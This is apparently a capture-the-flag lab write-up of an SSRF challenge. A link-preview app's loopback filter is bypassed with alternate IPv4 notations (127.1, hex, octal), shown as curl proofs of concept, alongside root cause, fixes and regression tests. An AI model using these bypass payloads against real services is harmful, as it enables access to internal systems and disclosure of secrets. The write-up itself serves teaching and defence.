# Baby SSRF Pwnbox Lab - Alternate Loopback SSRF Bypass

Date: 2026-07-08
Target type: CTF/lab
Bug class: SSRF, internal host filter bypass, alternate loopback notation, OG preview disclosure

## Observation

Chat preview app at `https://8c2c920ae0e7.pwnbox-lab.com/`.

Initial page hints:

- "paste a link, get a preview."
- "URLs that point at our internal infrastructure are refused."
- Challenge text: internal canary at `127.0.0.1:9999` holds the flag.

Form submits to `POST /post` with a single `message` field containing a URL.

The server fetches the URL and renders an OG-style preview with fields such as title, URL, and description.

## Hypothesis

The internal-host policy likely blocks only common loopback strings such as `127.0.0.1`, `localhost`, and maybe IPv6 loopback, but does not canonicalize alternate IPv4 loopback notations before making its decision.

If true, alternate forms like `127.1`, hex integer form, or octal form should still resolve to loopback and reach the canary on port 9999.

## Evidence

### Blocked direct forms

These returned preview title `host blocked by policy`:

- `http://127.0.0.1:9999/`
- `http://localhost:9999/`
- `http://[::1]:9999/`

### Working alternate loopback forms

These returned the flag in the OG preview title:

- `http://127.1:9999/`
- `http://0x7f000001:9999/`
- `http://0177.0.0.1:9999/`

Observed description:

```text
internal canary; do not expose
```

Observed title:

```text
pwnbox{f6a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6}
```

## Test

Minimal proof:

```bash
curl -sS -X POST "https://8c2c920ae0e7.pwnbox-lab.com/post" \
  --data-urlencode "message=http://127.1:9999/"
```

Equivalent working variants:

```bash
curl -sS -X POST "https://8c2c920ae0e7.pwnbox-lab.com/post" \
  --data-urlencode "message=http://0x7f000001:9999/"

curl -sS -X POST "https://8c2c920ae0e7.pwnbox-lab.com/post" \
  --data-urlencode "message=http://0177.0.0.1:9999/"
```

## Failed Assumptions

1. **Literal loopback only** — direct `127.0.0.1` was blocked by policy.
2. **`localhost` alias** — also blocked.
3. **IPv6 loopback** — `[::1]` blocked.
4. **Need for complex parser confusion** — unnecessary here; simple alternate IPv4 notation was enough.
5. **`file://` local read** — no evidence this path was needed or exposed for this challenge.

## Result

Confirmed chain:

```text
User-controlled URL in message
-> server-side link unfurler
-> host filter blocks only obvious internal host strings
-> alternate loopback form resolves to 127.0.0.1
-> request reaches 127.0.0.1:9999
-> OG preview reflects canary metadata
-> flag appears in preview title
```

Flag:

```text
pwnbox{f6a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6}
```

## Why Failed Payloads Failed

| Attempt | Why it failed |
|---|---|
| `http://127.0.0.1:9999/` | Literal loopback blocked by policy |
| `http://localhost:9999/` | Hostname alias blocked by policy |
| `http://[::1]:9999/` | IPv6 loopback blocked by policy |

## Why Working Payloads Worked

The filter appears to validate the raw user input or a narrow set of known-bad host strings rather than canonicalizing the destination to an IP and checking whether it is loopback. The HTTP client or resolver still interprets `127.1`, `0x7f000001`, and `0177.0.0.1` as loopback and connects to the internal service.

## Root Cause

1. Internal-host protection did not normalize alternate IPv4 loopback notations.
2. The final resolved destination was not checked against loopback/private ranges.
3. Preview rendering exposed internal response metadata directly to the user.

## Impact

- Access to loopback-only services despite internal-host restrictions.
- Disclosure of internal preview data and secrets.
- In other deployments, potential reach to admin panels, local daemons, or metadata services.

## Fix

- Parse and normalize the URL before policy decisions.
- Resolve the hostname and validate the final destination IP.
- Block all loopback representations, not just a few literal strings.
- Consider blocking link-local, RFC1918, and metadata ranges too.
- Avoid reflecting sensitive internal response bodies or OG data to untrusted users.

## Regression Test

- `http://127.1:9999/` must be blocked.
- `http://0x7f000001:9999/` must be blocked.
- `http://0177.0.0.1:9999/` must be blocked.
- Direct and alternate forms must all be normalized to loopback before fetch.

## Report Summary

Baby SSRF exposed a server-side link preview feature that tried to refuse internal hosts. The protection only blocked obvious loopback forms like `127.0.0.1` and `localhost`, but missed alternate IPv4 loopback notations such as `127.1`, `0x7f000001`, and `0177.0.0.1`. Those payloads reached `127.0.0.1:9999`, and the returned OG preview exposed the flag in the title.
